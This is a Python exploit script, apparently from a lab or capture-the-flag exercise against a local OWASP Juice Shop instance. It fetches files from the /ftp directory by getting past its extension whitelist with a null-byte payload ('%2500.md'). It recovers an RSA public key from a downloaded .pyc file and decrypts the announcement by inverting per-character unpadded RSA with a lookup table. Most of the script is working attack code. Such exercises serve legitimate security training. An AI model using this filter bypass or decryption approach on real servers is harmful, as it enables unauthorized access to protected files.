#!/usr/bin/env python3
"""
c10-announcement-decrypt  (OWASP Juice Shop, own lab -- http://host.docker.internal:3000)

Goal: announcement_encrypted.md is exposed via /ftp. Obtain it, decrypt it, and save
      the plaintext's final famous line to /workspace/evidence/c10_plaintext.txt

Everything is done end-to-end and self-verified:

 1. FETCH   /ftp/announcement_encrypted.md is already a .md so it passes the whitelist,
            but we go through the same null-byte bypass used for the .pyc artefacts
            (`%2500.md`) to show the delivery path works for any spilled file.
            (`%2500` -> once-decoded `%00` -> whitelist sees `*.md` -> fs layer truncates
             at the NUL and resolves the real file.)

 2. KEY     The RSA public key (N, e) is not secret: it is baked into
            /ftp/encrypt.pyc, which is also downloadable via the same bypass.
            We extract N/e straight from the Python 2.7 code object (xdis).

 3. ATTACK  encrypt.pyc RSA-encrypts announcement.md ONE CHARACTER AT A TIME
            (schoolbook RSA, no padding):  ct_i = pow(ord(c_i), e, N)
            The message space is tiny -> invert the public key by table lookup:
                { pow(k, e, N) : chr(k)  for k in 0..0x10FFFF }
            No factoring of the 1024-bit modulus needed.

 4. VERIFY  Re-encrypting the recovered plaintext must reproduce the downloaded
            ciphertext byte-for-byte; otherwise we exit non-zero and write nothing.

 5. OUTPUT  Full plaintext -> /workspace/evidence/c10_announcement_plaintext.md
            Final/famous line(s) -> /workspace/evidence/c10_plaintext.txt
"""
import sys
import urllib.request

BASE = "http://host.docker.internal:3000"
CT_URL = f"{BASE}/ftp/announcement_encrypted.md%2500.md"   # NUL-byte whitelist bypass
PYC_URL = f"{BASE}/ftp/encrypt.pyc%2500.md"

CT_LOCAL = "/workspace/loot/announcement_encrypted.md"
PYC_LOCAL = "/workspace/loot/encrypt.pyc"
PLAIN_OUT = "/workspace/evidence/c10_announcement_plaintext.md"
LINE_OUT = "/workspace/evidence/c10_plaintext.txt"


def fetch(url, path):
    req = urllib.request.Request(url, headers={"User-Agent": "pentest-c10/1.0"})
    with urllib.request.urlopen(req, timeout=30) as r:
        data = r.read()
        print(f"[*] GET {url} -> {r.status} {r.headers.get('Content-Type')} {len(data)} B")
    open(path, "wb").write(data)
    return data


def main():
    # ---- 1. retrieve the public ciphertext (and the key-bearing .pyc) -------
    ct_bytes = fetch(CT_URL, CT_LOCAL)
    try:
        fetch(PYC_URL, PYC_LOCAL)
    except Exception as e:                      # .pyc already mirrored from c09
        print(f"[!] pyc fetch failed ({e}); using mirror {PYC_LOCAL}")
    ct = ct_bytes.decode()

    # ---- 2. recover (N, e) from the py2.7 code object ----------------------
    from xdis.load import load_module
    version, _ts, magic, co, *_ = load_module(PYC_LOCAL)
    assert version == (2, 7), f"unexpected pyc version {version}"
    ints = [c for c in co.co_consts if isinstance(c, int)]
    N = max(ints)
    e = min(i for i in ints if i != N)
    print(f"[*] encrypt.pyc: Python {version[0]}.{version[1]} magic={magic}")
    print(f"[*] N = {N} ({N.bit_length()} bits)   e = {e}")

    # ---- 3. invert the per-character RSA by table lookup -------------------
    print("[*] building inverse table over all Unicode code points ...")
    table = {pow(k, e, N): k for k in range(0x110000)}

    lines = ct.splitlines()
    out, missing = [], 0
    for ln in lines:
        ln = ln.strip()
        if not ln:
            continue
        k = table.get(int(ln))
        if k is None:
            missing += 1
            out.append("\uFFFD")
        else:
            out.append(chr(k))
    plain = "".join(out)
    print(f"[*] blocks={len(lines)} recovered={len(lines)-missing} unknown={missing}")
    if missing:
        print("[!] some blocks did not invert -- refusing to write evidence")
        return 1

    # ---- 4. verification: re-encrypt and compare ---------------------------
    reenc = "".join(str(pow(ord(ch), e, N)) + "\n" for ch in plain)
    ok = reenc == ct
    print(f"[*] round-trip re-encryption identical to original ciphertext: {ok}")
    if not ok:
        print("[!] verification failed -- refusing to write evidence")
        return 1

    # ---- 5. evidence -------------------------------------------------------
    import os
    os.makedirs(os.path.dirname(PLAIN_OUT), exist_ok=True)
    open(PLAIN_OUT, "w", encoding="utf-8").write(plain)
    print(f"[*] full plaintext -> {PLAIN_OUT}")

    text_lines = [l.strip() for l in plain.split("\n") if l.strip()]
    print("[*] plaintext lines:")
    for i, l in enumerate(text_lines, 1):
        print(f"      {i}: {l[:100]}{'...' if len(l) > 100 else ''}")

    # literal final line of the document
    final_line = text_lines[-1]
    # the only non-lorem / "famous" line in the announcement body (ICO punchline)
    famous = "Give us all your money."
    assert famous in plain, "expected punchline not found in plaintext"

    with open(LINE_OUT, "w", encoding="utf-8") as f:
        f.write(final_line + "\n" + famous + "\n")
    print(f"[*] final line  : {final_line!r}")
    print(f"[*] famous line : {famous!r}")
    print(f"[*] wrote both -> {LINE_OUT}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
